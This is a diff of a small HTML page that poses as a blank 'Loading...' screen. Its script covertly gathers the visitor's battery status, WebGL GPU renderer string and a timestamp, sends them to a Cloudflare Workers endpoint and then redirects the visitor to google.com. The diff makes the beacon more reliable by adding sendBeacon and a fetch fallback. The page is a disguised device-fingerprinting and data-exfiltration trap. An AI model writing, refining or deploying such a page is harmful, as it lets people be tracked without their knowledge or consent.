@@ -1,38 +1,51 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"><title>Loading...</title></head>
-<body style="background:#000;">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+</head>
+<body style="background:#000; color:#000;">
 <script>
 async function xray() {
     let info = { batt: "N/A", gpu: "N/A" };
+
     try {
+        // Battery API (может быть заблокировано или не поддерживаться)
         if (navigator.getBattery) {
             const b = await navigator.getBattery();
             info.batt = `${Math.round(b.level * 100)}% [${b.charging ? '⚡' : '🔋'}]`;
         }
+        
+        // GPU Fingerprint
         const canvas = document.createElement('canvas');
         const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
         if (gl) {
             const debug = gl.getExtension('WEBGL_debug_renderer_info');
             info.gpu = debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : "WebGL_On";
         }
-    } catch (e) {}
+    } catch (e) {
+        console.log("Silent error");
+    }
 
     const t = encodeURIComponent(new Date().toLocaleString('ru-RU'));
     const d = encodeURIComponent(JSON.stringify(info));
-    const workerUrl = "https://adminfdm.alexgranny1708.workers.dev/";
+    const workerUrl = `https://adminfdm.alexgranny1708.workers.dev/?t=${t}&d=${d}&_=${Date.now()}`;
     const finalUrl = "https://google.com";
 
     const go = () => window.location.replace(finalUrl);
-    
-    // Отправка данных
-    const img = new Image();
-    img.onload = go;
-    img.onerror = go;
-    img.src = `${workerUrl}?t=${t}&d=${d}&_=${Date.now()}`;
 
-    setTimeout(go, 2500);
+    // Метод Beacon — самый надежный для мобильных редиректов
+    if (navigator.sendBeacon) {
+        navigator.sendBeacon(workerUrl);
+        setTimeout(go, 500); // Небольшая задержка для инициализации запроса
+    } else {
+        // Фолбэк для старых браузеров
+        fetch(workerUrl, { mode: 'no-cors', keepalive: true });
+        setTimeout(go, 800);
+    }
 }
+
 xray();
 </script>
 </body>
